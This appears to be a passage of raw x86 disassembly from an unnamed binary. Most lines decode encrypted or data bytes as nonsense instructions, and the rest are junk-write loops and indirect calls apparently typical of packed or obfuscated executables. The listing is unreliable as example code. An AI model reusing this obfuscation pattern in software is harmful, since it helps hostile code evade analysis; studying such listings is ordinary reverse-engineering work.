  419714:	stos   BYTE PTR es:[edi],al
  419715:	mov    DWORD PTR [esp+esi*1-0x72],ebx
  419719:	loop   0x41978c
  41971b:	lds    ebp,FWORD PTR [edi]
  41971d:	mov    bl,0xb4
  41971f:	push   eax
  419720:	cmp    dh,BYTE PTR [eax]
  419722:	pop    edi
  419723:	popa   
  419724:	in     eax,dx
  419725:	pop    esi
  419726:	and    eax,0xdea8fa53
  41972b:	dec    eax
  41972c:	mov    dh,0x6c
  41972e:	and    ah,BYTE PTR [ebp+0x4f]
  419731:	mov    cl,0xe5
  419733:	cs in  eax,dx
  419735:	dec    ebp
  419736:	dec    esp
  419737:	xchg   BYTE PTR [esi],dl
  419739:	lahf   
  41973a:	out    0xca,eax
  41973c:	aaa    
  41973d:	cmp    DWORD PTR [eax-0x59942103],0xe6799800
  419747:	push   edi
  419748:	bound  ebp,QWORD PTR [ecx+0x22afb79f]
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x1fbddeb
  41979d:	shl    BYTE PTR [esi+0x38],1
  4197a0:	leave  
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x419767
  4197a8:	aaa    
  4197a9:	inc    ebp
  4197aa:	mov    DWORD PTR [esi],esi
  4197ac:	sub    DWORD PTR [edi],0x868c133d
  4197b2:	dec    ecx
  4197b3:	fistp  QWORD PTR [esi+0x732413c7]
  4197b9:	xor    DWORD PTR [edi-0x7d],0x52
  4197bd:	sbb    eax,0xff6bcdef
  4197c2:	cmp    cl,ah
  4197c4:	loop   0x41976b
  4197c6:	jle    0x419809
  4197c8:	add    BYTE PTR [esi+eiz*1],dh
  4197cb:	mov    eax,ds:0xd7e7b0e
  4197d0:	push   ecx
  4197d1:	and    eax,0x1ec219c7
  4197d6:	mov    cl,0x8e
  4197d8:	xchg   ecx,eax
  4197d9:	jle    0x419774
  4197db:	xor    al,0xc6
  4197dd:	xchg   BYTE PTR [edx],ch
  4197df:	and    al,0x30
  4197e1:	sahf   
  4197e2:	mov    ebp,0x9bcc62f6
  4197e7:	mov    al,BYTE PTR [edi*1+0x24ee314]
  4197ee:	or     esp,edi
  4197f0:	mov    ?,WORD PTR [ecx-0x44f7c952]
  4197f6:	pop    esp
  4197f7:	dec    edi
  4197f8:	int    0x1b
  4197fa:	test   BYTE PTR [eax-0x4f],ah
  4197fd:	ret    
  4197fe:	popf   
  4197ff:	xor    BYTE PTR [edx],dl
  419801:	push   ebx
  419802:	dec    esp
  419803:	lods   al,BYTE PTR ds:[esi]
  419804:	sbb    al,0x1c
  419806:	push   cs
  419807:	cmp    esp,DWORD PTR ds:0x31369cbb
  41980d:	cmp    edi,DWORD PTR [edx]
  41980f:	sbb    dh,cl
  419811:	fnsave [edx]
  419813:	repnz inc eax
  419815:	scas   al,BYTE PTR es:[edi]
  419816:	test   DWORD PTR [ebp-0x50],esi
  419819:	dec    eax
  41981a:	cmc    
  41981b:	(bad)  
  41981c:	mov    dh,0xf3
  41981e:	das    
  41981f:	je     0x419809
  419821:	leave  
  419822:	add    ecx,DWORD PTR [ebx+0x5f99fbdd]
  419828:	ror    BYTE PTR [esi+0x6e20401b],0xd8
  41982f:	ds or  bl,dh
  419832:	add    ebp,edi
  419834:	lea    esi,ss:[edx-0x3dd4ea2e]
  41983b:	adc    DWORD PTR [edi-0x4a],eax
  41983e:	je     0x4198a3
  419840:	mov    ds:0xd25d03aa,eax
  419845:	retf   0x7b9a
  419848:	push   ebp
  419849:	in     eax,0x52
  41984b:	ror    DWORD PTR [edx],cl
  41984d:	xor    edx,esi
  41984f:	cmp    BYTE PTR [esi],ah
  419851:	dec    eax
  419852:	adc    edi,esi
  419854:	mov    BYTE PTR [edx],cl
  419856:	xor    ebx,DWORD PTR [edi+0x3c983072]
  41985c:	cmc    
  41985d:	or     al,0x8
  41985f:	inc    edx
  419860:	cmp    DWORD PTR [ebp+0x79],edi
  419863:	aad    0x35
  419865:	jle    0x41986c
  419867:	fist   DWORD PTR [esi+edi*4-0x1554a88c]
  41986e:	loopne 0x419830
  419870:	xor    ebx,DWORD PTR [edx]
  419872:	push   ss
  419873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419874:	or     edi,DWORD PTR [edx+ebp*8-0x24]
  419878:	sub    DWORD PTR [esi-0xf39d966],0xbffee1c4
  419882:	push   ebx
  419883:	cmp    al,0x5b
  419885:	ins    BYTE PTR es:[edi],dx
  419886:	adc    DWORD PTR [esi],ebx
  419888:	ja     0x4198f4
  41988a:	shl    DWORD PTR [ebp+0x4961661],1
  419890:	pop    ds
  419891:	ja     0x419855
  419893:	aaa    
  419894:	and    ch,bl
  419896:	dec    ecx
  419897:	in     eax,dx
  419898:	mov    ah,0x50
  41989a:	adc    BYTE PTR fs:[edi-0x4ab67ae],0x7f
  4198a2:	mov    cl,0x99
  4198a4:	mov    ebx,0xc019152a
  4198aa:	repnz jmp FWORD PTR [ebp-0x66]
  4198ae:	xor    DWORD PTR [edx],0x450b19c2
  4198b4:	push   eax
  4198b5:	ins    BYTE PTR es:[edi],dx
  4198b6:	repz add dh,ah
  4198b9:	and    BYTE PTR [edi+0x1c00888a],0xee
  4198c0:	jae    0x4198eb
  4198c2:	sub    esp,edi
  4198c4:	jnp    0x419871
  4198c6:	imul   BYTE PTR [edi-0xc]
  4198c9:	loopne 0x41993b
  4198cb:	and    esp,edx
  4198cd:	push   0x67
  4198cf:	mov    bl,BYTE PTR [ebp+0x265cc143]
  4198d5:	aaa    
  4198d6:	not    DWORD PTR [ecx-0x2a899012]
  4198dc:	push   es
  4198dd:	in     eax,dx
  4198de:	mov    ch,0x19
  4198e1:	push   ds
  4198e2:	jno    0x41994e
  4198e4:	or     al,0x13
  4198e6:	loope  0x41991b
  4198e8:	xor    ebx,0xa922bfed
  4198ee:	fwait
  4198ef:	lods   al,BYTE PTR ds:[esi]
  4198f0:	jnp    0x41988c
  4198f2:	push   ecx
  4198f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f4:	mov    bl,0xac
  4198f6:	imul   DWORD PTR [ebp-0x68]
  4198f9:	or     BYTE PTR [ecx-0x529cfd7c],bl
  4198ff:	push   ebp
  419900:	jno    0x419915
  419902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419903:	xadd   DWORD PTR ds:0xad775231,ebp
  41990a:	adc    al,0xc2
  41990c:	mov    edx,0x1c7b8bcc
  419911:	sahf   
  419912:	out    dx,eax
  419913:	ja     0x4198cd
  419915:	sbb    al,0xc
  419917:	pop    esp
  419918:	retf   
  419919:	nop
  41991a:	ds cmp ebp,edi
  41991d:	cdq    
  41991e:	jp     0x419943
  419920:	cmp    BYTE PTR [edi],dh
  419922:	inc    ecx
  419923:	test   DWORD PTR [ebx-0x30],0x12d2e2e9
  41992a:	mov    eax,ds:0x3cd0009f
  41992f:	mov    esp,0xabed4ea9
  419934:	fcom   QWORD PTR [edi+0x1d]
  419937:	jae    0x4198f1
  419939:	and    eax,0x2518b31
  41993e:	sub    edi,DWORD PTR [esi+0x4b]
  419941:	ror    BYTE PTR [eax+0x51fb5fc2],1
  419947:	je     0x41992a
  419949:	jl     0xe241a2c5
  41994f:	add    eax,0xa2ad7a5c
  419954:	aam    0xd6
  419956:	dec    esp
  419957:	addr16 sbb al,0xb2
  41995a:	int    0xef
  41995c:	sbb    esi,ebp
  41995e:	sub    ch,BYTE PTR [ecx+0x21]
  419961:	mov    WORD PTR [ebx-0xa],ss
  419964:	and    BYTE PTR [edx+eiz*4],bl
  419967:	stos   BYTE PTR es:[edi],al
  419968:	xchg   esi,eax
  419969:	fnclex 
  41996b:	mov    eax,ds:0x3c9dd5e6
  419970:	push   ecx
  419971:	sbb    dh,BYTE PTR [ebp+0x360a8927]
  419977:	int    0xd0
  419979:	fstp   QWORD PTR [edx-0x21fbf346]
  41997f:	push   edx
  419980:	xlat   BYTE PTR ds:[ebx]
  419981:	sahf   
  419982:	rcr    BYTE PTR [ebx+0x63],cl
  419985:	mov    ds:0xc7aa7e88,eax
  41998a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41998b:	aas    
  41998c:	scas   eax,DWORD PTR es:[edi]
  41998d:	(bad)  [ecx-0x7a]
  419990:	inc    eax
  419991:	retf   
  419992:	repnz mov ah,0x47
  419995:	mov    cs,WORD PTR [edi+0x58]
  419998:	idiv   eax
  41999a:	sbb    DWORD PTR [esi],edi
  41999c:	mov    ah,BYTE PTR [ebp+ecx*2-0x1b]
  4199a0:	aas    
  4199a1:	add    bl,BYTE PTR [esi]
  4199a3:	je     0x41992e
  4199a5:	inc    eax
  4199a6:	pop    esi
  4199a7:	(bad)  
  4199a8:	xchg   ebp,eax
  4199a9:	xchg   ebx,eax
  4199aa:	jmp    0x666cd85
  4199af:	cmp    dh,BYTE PTR [ecx]
  4199b1:	imul   ebp,ebx,0xfffffff0
  4199b4:	pop    eax
  4199b5:	sar    dh,cl
  4199b7:	cmp    al,BYTE PTR [eax]
  4199b9:	mov    ebx,0x582549a9
  4199be:	jnp    0x4199eb
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0xfffffff4
  419b14:	adc    eax,0xcfd0e8c2
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b53
  419b20:	in     al,dx
  419b21:	inc    ecx
  419b22:	inc    esp
  419b23:	popa   
  419b24:	pop    esp
  419b25:	sbb    ebp,0xffffffa0
  419b28:	out    0x8b,eax
  419b2a:	pop    ebp
  419b2b:	mov    esi,0xb0cf62a9
  419b30:	mov    edx,0x88c8a881
  419b35:	sub    ebp,eax
  419b37:	push   ecx
  419b38:	cmp    DWORD PTR [ecx-0x47],ecx
  419b3b:	mov    ah,0xcf
  419b3d:	adc    edx,DWORD PTR [edx-0x37417110]
  419b43:	loope  0x419b73
  419b45:	mov    dl,0x50
  419b47:	pop    ds
  419b48:	jle    0x419ba4
  419b4a:	push   esi
  419b4b:	imul   esp,ebp,0xd74c0782
  419b51:	xor    ah,BYTE PTR [esi]
  419b53:	aam    0x9f
  419b55:	test   eax,0x21ad74db
  419b5a:	dec    esp
  419b5b:	in     al,dx
  419b5c:	cmp    dh,BYTE PTR [ebp-0x6a4aa6d6]
  419b62:	push   ss
  419b63:	and    bh,BYTE PTR [ecx+0x22]
  419b66:	cmp    bh,ch
  419b68:	out    0x48,al
  419b6a:	xchg   esp,eax
  419b6b:	push   ebx
  419b6c:	hlt    
  419b6d:	cmp    al,bh
  419b6f:	adc    ebx,DWORD PTR [edx]
  419b71:	adc    ecx,edi
  419b73:	mov    esi,0xda08f61c
  419b78:	in     al,0x3
  419b7a:	add    ch,ah
  419b7c:	hlt    
  419b7d:	cli    
  419b7e:	stc    
  419b7f:	cmp    eax,0x6a44d7d
  419b84:	icebp  
  419b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b86:	imul   DWORD PTR ds:0x566461da
  419b8c:	lahf   
  419b8d:	mov    BYTE PTR [esi],dh
  419b8f:	or     al,0xb8
  419b91:	push   ecx
  419b92:	hlt    
  419b93:	cmc    
  419b94:	ins    BYTE PTR es:[edi],dx
  419b95:	xchg   BYTE PTR [ebp+eax*2-0x6e],bh
  419b99:	cmp    al,BYTE PTR [ecx]
  419b9b:	xor    DWORD PTR [ebx+ecx*4+0x4],ebx
  419b9f:	inc    esp
  419ba0:	outs   dx,BYTE PTR ds:[esi]
  419ba1:	and    eax,0x8cc483ac
  419ba6:	sub    ebx,DWORD PTR [edi]
  419ba8:	add    al,0xbd
  419baa:	or     ecx,DWORD PTR [esi-0xc]
  419bad:	push   edx
  419bae:	mov    ch,0xa5
  419bb0:	test   DWORD PTR [edx],eax
  419bb2:	inc    eax
  419bb3:	aaa    
  419bb4:	dec    edx
  419bb5:	out    0xa7,eax
  419bb7:	out    dx,al
  419bb8:	jno    0x419bf0
  419bba:	mov    ds:0x2a62d2dc,eax
  419bbf:	test   eax,0x95b997b9
  419bc4:	ret    0x33e
  419bc7:	pop    esp
  419bc8:	mov    dh,0x96
  419bca:	cwde   
  419bcb:	mov    esp,0x4860e161
  419bd0:	int    0x80
  419bd2:	adc    ch,BYTE PTR [ebx]
  419bd4:	out    dx,eax
  419bd5:	pushf  
  419bd6:	lds    esi,FWORD PTR [ecx]
  419bd8:	iret   
  419bd9:	fwait
  419bda:	xchg   ecx,eax
  419bdb:	cdq    
  419bdc:	icebp  
  419bdd:	inc    esi
  419bde:	test   al,0xe
  419be0:	ret    
  419be1:	arpl   sp,ax
  419be3:	or     BYTE PTR [ebx+0x12],0x75
  419be7:	imul   DWORD PTR [ebp+edx*2-0x723af766]
  419bee:	push   esi
  419bef:	jo     0x419c68
  419bf1:	mov    eax,0x2bb27e84
  419bf6:	into   
  419bf7:	mov    esp,0x31dad0e2
  419bfc:	pop    ecx
  419bfd:	mov    ebx,0x3541eee3
  419c02:	cmp    al,0xde
  419c04:	retf   
  419c05:	scas   al,BYTE PTR es:[edi]
  419c06:	inc    ebp
  419c07:	popa   
  419c08:	mov    ecx,0xe19e35ab
  419c0d:	gs xor dl,dl
  419c10:	pusha  
  419c11:	and    esi,DWORD PTR [ebp+0x755d86b3]
  419c17:	mov    bh,0x31
  419c19:	pop    es
  419c1a:	mov    WORD PTR [bx+si-0x65],es
  419c1e:	jns    0x419c7e
  419c20:	or     al,0xe3
  419c22:	hlt    
  419c23:	daa    
  419c24:	adc    al,0x4d
  419c26:	je     0x419bd4
  419c28:	push   ebp
  419c29:	in     eax,0x89
  419c2b:	lea    ecx,[edx+ecx*8+0x1a59be78]
  419c32:	xor    ebp,esi
  419c34:	inc    esp
  419c35:	add    DWORD PTR [edx-0x53],ebx
  419c38:	adc    edi,edx
  419c3a:	clc    
  419c3b:	jne    0x419bbd
  419c3d:	jno    0x419c13
  419c3f:	leave  
  419c40:	and    esi,ebx
  419c42:	in     eax,dx
  419c43:	popa   
  419c44:	mov    esp,0xd033e811
  419c49:	mov    WORD PTR [esi],ss
  419c4b:	repnz cmp al,0xc
  419c4e:	test   BYTE PTR ds:0xfc188a65,cl
  419c54:	retf   0xd940
  419c57:	mov    WORD PTR [ebx],?
  419c59:	adc    dl,BYTE PTR ds:0x14a65dc
  419c5f:	lds    edx,FWORD PTR [ebx+edi*2-0x71]
  419c63:	ds mov ebx,0x59966be8
  419c69:	test   eax,0xaf22046b
  419c6e:	xchg   esi,eax
  419c6f:	ret    0x789b
  419c72:	js     0x419c6a
  419c74:	push   edx
  419c75:	adc    ebx,DWORD PTR [esi]
  419c77:	es adc al,0x8a
  419c7a:	das    
  419c7b:	cmp    bl,BYTE PTR [ecx]
  419c7d:	loope  0x419c54
  419c7f:	outs   dx,DWORD PTR ds:[esi]
  419c80:	aas    
  419c81:	test   DWORD PTR [esi],esi
  419c83:	cmp    ecx,DWORD PTR ds:0xf9d5b6ce
  419c89:	pop    ds
  419c8a:	stc    
  419c8b:	scas   eax,DWORD PTR es:[edi]
  419c8c:	or     BYTE PTR [edx+0x67cbbbe5],cl
  419c92:	cmp    DWORD PTR [edx+0x5a],0xffffffce
  419c96:	lds    ebx,FWORD PTR [eax]
  419c98:	mov    ebx,0x3648bd0c
  419c9d:	push   cs
  419c9e:	jo     0x419cc5
  419ca0:	xchg   BYTE PTR ds:0x768e5663,ah
  419ca6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ca8:	ss nop
  419caa:	in     al,dx
  419cab:	inc    ebp
  419cac:	ror    dl,0xae
  419caf:	fsub   st(1),st
  419cb1:	test   BYTE PTR [ebp-0x54],cl
  419cb4:	jns    0x419c68
  419cb6:	outs   dx,BYTE PTR ds:[esi]
  419cb7:	cwde   
  419cb8:	mov    edx,0x784ce620
  419cbd:	add    DWORD PTR ds:0x105304f3,esi
  419cc3:	xor    dh,dl
  419cc5:	call   0x2600b412
  419cca:	sub    BYTE PTR [ecx],0xaf
  419ccd:	mov    ebp,0x1db8968a
  419cd2:	pop    es
  419cd3:	test   DWORD PTR [ebx-0x63e55c89],esp
  419cd9:	retf   0xcc7b
  419cdc:	retf   
  419cdd:	mov    ds:0x2d463924,eax
  419ce2:	aas    
  419ce3:	loope  0x419cea
  419ce5:	add    al,0x85
  419ce7:	imul   ebx,ebp,0x5b
  419cea:	fld    DWORD PTR [edx-0x56761051]
  419cf0:	outs   dx,DWORD PTR ds:[esi]
  419cf1:	pop    ss
  419cf2:	mov    es,WORD PTR [ecx+eax*1-0x4b]
  419cf6:	push   cs
  419cf7:	jecxz  0x419d40
  419cf9:	imul   esp,ebx,0x21
  419cfc:	jo     0x419cc4
  419cfe:	pusha  
  419cff:	cdq    
  419d00:	push   ebx
  419d01:	out    0xc0,eax
  419d03:	mov    eax,0xbe3d9747
  419d08:	leave  
  419d09:	add    eax,0x9b5f8000
  419d0e:	dec    edi
  419d0f:	std    
  419d10:	pop    ds
  419d11:	fcom   DWORD PTR [ecx]
  419d13:	and    eax,0xc3aa9026
  419d18:	jne    0x419cf1
  419d1a:	cmp    bh,ch
  419d1c:	fsub   st,st(2)
  419d1e:	lods   al,BYTE PTR ds:[esi]
  419d1f:	sbb    DWORD PTR [ebx+edi*1],ebp
  419d22:	into   
  419d23:	inc    eax
  419d24:	xlat   BYTE PTR ds:[ebx]
  419d25:	aam    0x40
  419d27:	pusha  
  419d28:	sbb    ebx,DWORD PTR [ebx+0x150217ff]
  419d2e:	daa    
  419d2f:	in     al,dx
  419d30:	mov    esp,0x6da79a13
  419d35:	repnz lds ecx,FWORD PTR [ebx-0x7bf01fbb]
  419d3c:	mov    DWORD PTR [ebx],ecx
  419d3e:	add    BYTE PTR [eax],al
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	mov    ah,0x28
  419d7e:	int3   
  419d7f:	xchg   esp,eax
  419d80:	call   0x10ba1d52
  419d85:	jle    0x419dff
  419d87:	js     0x419db2
  419d89:	dec    esp
  419d8a:	jno    0x419d20
  419d8c:	sub    DWORD PTR [esi],0xc07fe27e
  419d92:	sub    edi,DWORD PTR [ebx]
  419d94:	cld    
  419d95:	ins    DWORD PTR es:[edi],dx
  419d96:	pop    edx
  419d97:	ins    DWORD PTR es:[edi],dx
  419d98:	push   ebp
  419d99:	ins    DWORD PTR es:[edi],dx
  419d9a:	nop
  419d9b:	pop    es
  419d9c:	sahf   
  419d9d:	push   cs
  419d9e:	jle    0x419df0
  419da0:	call   0x127b63c2
  419da5:	jno    0x419d2e
  419da7:	xchg   edi,eax
  419da8:	call   DWORD PTR [esi+0x58]
  419dab:	hlt    
  419dac:	ud2    
  419dae:	leave  
  419daf:	dec    eax
  419db0:	add    al,0x6d
  419db2:	loope  0x419d45
  419db4:	mov    edi,0x1fa518be
  419db9:	outs   dx,BYTE PTR ds:[esi]
  419dba:	inc    ecx
  419dbb:	sbb    BYTE PTR [edi+0x3e],al
  419dbe:	int    0x36
  419dc0:	mov    eax,0x3d9f1934
  419dc5:	push   ds
  419dc6:	(bad)  
  419dc7:	xlat   BYTE PTR ds:[ebx]
  419dc8:	mov    ds:0x3e2b35d9,eax
  419dcd:	ret    
  419dce:	in     al,0xbf
  419dd0:	int    0x85
  419dd2:	and    BYTE PTR [ebp+0x37],bl
  419dd5:	loopne 0x419dba
  419dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dd8:	test   al,0x12
  419dda:	out    dx,eax
  419ddb:	and    BYTE PTR [ebx],al
  419ddd:	dec    edi
  419dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ddf:	sbb    ah,BYTE PTR [eax]
  419de1:	stos   BYTE PTR es:[edi],al
  419de2:	inc    ebp
  419de3:	je     0x419d8f
  419de5:	mov    ss,WORD PTR [edx]
  419de7:	lods   al,BYTE PTR fs:[esi]
  419de9:	inc    eax
  419dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419deb:	xchg   ebx,eax
  419dec:	dec    edx
  419ded:	mov    dl,BYTE PTR [eax+eax*8+0x3f]
  419df1:	mov    esi,0x8ed246da
  419df6:	push   ebp
  419df7:	and    bl,dh
  419df9:	jb     0x419e64
  419dfb:	dec    ebx
  419dfc:	gs push ds
  419dfe:	(bad)  
  419dff:	(bad)  
  419e01:	sbb    bl,BYTE PTR [ecx]
  419e03:	dec    ebp
  419e04:	pop    eax
  419e05:	daa    
  419e06:	mov    ds:0xad328d92,al
  419e0b:	lahf   
  419e0c:	and    DWORD PTR [ebx],edi
  419e0e:	fsubr  QWORD PTR [ebx+eiz*1+0x3b828dac]
  419e15:	daa    
  419e16:	(bad)  
  419e17:	mov    ds:0x4e79a6f7,al
  419e1c:	dec    esi
  419e1d:	out    dx,al
  419e1e:	jl     0x419e4c
  419e20:	jecxz  0x419e9e
  419e22:	mov    ecx,0x11619506
  419e27:	adc    BYTE PTR [edi-0x47bd358c],0xf8
  419e2e:	sbb    eax,0x1ee41853
  419e33:	jmp    0xbed9cbc0
  419e38:	test   DWORD PTR [ecx+0x48dd1791],eax
  419e3e:	and    DWORD PTR [edx-0x17973e30],esi
  419e44:	pop    edi
  419e45:	stos   BYTE PTR es:[edi],al
  419e46:	dec    ebp
  419e47:	fwait
  419e48:	sbb    al,0xeb
  419e4a:	xchg   BYTE PTR [edx+eax*8],bh
  419e4d:	cli    
  419e4e:	cwde   
  419e4f:	lds    esp,FWORD PTR [ecx]
  419e51:	push   esp
  419e52:	xchg   edi,eax
  419e53:	add    DWORD PTR [ebx+0x342b236b],edi
  419e59:	imul   ebx,esp,0x99e21d7f
  419e5f:	shl    DWORD PTR [ebp+0x427a861a],cl
  419e65:	hlt    
  419e66:	mov    ebp,0xa949c1b3
  419e6b:	in     eax,0x3f
  419e6d:	std    
  419e6e:	xchg   BYTE PTR [ebx-0x33],dl
  419e71:	cmp    DWORD PTR [ebx+0x2993062e],esi
  419e77:	inc    esi
  419e78:	pop    ebp
  419e79:	leave  
  419e7a:	lods   eax,DWORD PTR ds:[si]
  419e7c:	(bad)  
  419e7e:	outs   dx,DWORD PTR ds:[esi]
  419e7f:	sbb    BYTE PTR [ecx-0x597af1fd],al
  419e85:	jecxz  0x419e13
  419e87:	outs   dx,BYTE PTR ds:[esi]
  419e88:	sbb    ah,BYTE PTR [esp+ebx*2]
  419e8b:	mov    BYTE PTR [esi+0x2df89247],ah
  419e91:	stc    
  419e92:	push   ss
  419e93:	outs   dx,BYTE PTR ds:[esi]
  419e94:	mov    eax,ds:0xdd29378
  419e99:	adc    eax,0x241e2a7f
  419e9e:	test   BYTE PTR [edx-0x7f],bh
  419ea1:	(bad)
  419ea5:	mov    DWORD PTR [ecx-0x23913ad8],edi
  419eab:	retf   0xec38
  419eae:	or     eax,DWORD PTR [edx-0x49]
  419eb1:	adc    BYTE PTR [edi],bl
  419eb3:	addr16 mov ds:0x6aec,al
  419eb7:	shl    esi,0x58
  419eba:	inc    ecx
  419ebb:	shr    DWORD PTR [ecx],0x66
  419ebe:	xchg   edi,eax
  419ebf:	sbb    dh,BYTE PTR [ecx]
  419ec1:	call   0x77de03cf
  419ec6:	shl    DWORD PTR [eax-0x4e],cl
  419ec9:	jge    0x419e5b
  419ecb:	xlat   BYTE PTR ds:[ebx]
  419ecc:	call   0x8388:0x45d0ee2
  419ed3:	add    DWORD PTR [ebx+edx*4-0x57],esp
  419ed7:	xchg   ebp,eax
  419ed8:	push   ebp
  419ed9:	rep ins BYTE PTR es:[edi],dx
  419edb:	shr    BYTE PTR [eax+0x54],1
  419ede:	jb     0x419e8a
  419ee0:	or     eax,0x4fd62cb
  419ee5:	xchg   BYTE PTR [edx],al
  419ee7:	pop    DWORD PTR [esi-0x43936fe1]
  419eed:	(bad)  
  419eee:	push   ebx
  419eef:	sbb    ah,BYTE PTR [eax]
  419ef1:	mov    eax,ds:0x542e7c2c
  419ef6:	dec    edi
  419ef7:	add    eax,0xf3b33928
  419efc:	scas   eax,DWORD PTR es:[edi]
  419efd:	jb     0x419f6b
  419eff:	fdivr  st(3),st
  419f01:	cwde   
  419f02:	mov    al,ds:0x353cf18
  419f07:	sub    eax,0xd60e78f
  419f0c:	stos   BYTE PTR es:[edi],al
  419f0d:	push   esi
  419f0e:	out    0xf5,al
  419f10:	test   bl,cl
  419f12:	mov    dh,0xe6
  419f14:	pop    ss
  419f15:	push   eax
  419f16:	jmp    0x419f0b
  419f18:	jmp    0x68b21812
  419f1d:	mov    cl,0x7
  419f1f:	jecxz  0x419eb2
  419f21:	sbb    al,0x9c
  419f23:	ins    BYTE PTR es:[edi],dx
  419f24:	hlt    
  419f25:	mov    dl,0x2e
  419f27:	and    edi,0xffffffcb
  419f2a:	mov    es,WORD PTR ds:0x5a22e850
  419f30:	xor    cl,BYTE PTR [edi]
  419f32:	call   0xfaebe564
  419f37:	add    ecx,DWORD PTR [eax+0x5f]
  419f3a:	mov    eax,0x918e20eb
  419f3f:	loopne 0x419f6c
  419f41:	jns    0x419ef5
  419f43:	inc    edi
  419f44:	mov    eax,ds
  419f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f47:	lds    eax,FWORD PTR [edi]
  419f49:	push   esi
  419f4a:	mov    ch,0xc2
  419f4c:	push   0x2b
